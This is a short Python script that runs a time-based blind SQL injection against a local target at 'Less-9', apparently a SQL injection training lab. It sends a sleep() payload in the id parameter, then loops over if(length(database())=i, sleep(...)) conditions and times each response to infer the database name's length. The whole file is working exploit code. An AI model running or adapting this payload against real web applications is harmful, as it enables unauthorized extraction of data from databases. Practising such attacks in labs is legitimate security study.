import requests

base_url = "http://localhost:8001/Less-9/"

query = "sleep(0.05)"

end = " -- "
query_breaker = "' and "
params = {'id': "1" + query_breaker + query + end}

r = requests.get(base_url,params)
print(r.content)
print(r.url)
print(r.elapsed.total_seconds())

for i in range(100):
    query = "if(length(database())=" + str(i) + ", sleep(0.05), null)"
    params = {'id': "1" + query_breaker + query + end}
    r = requests.get(base_url,params)
    if r.elapsed.total_seconds() > 0.05:
        print(i)
        exit()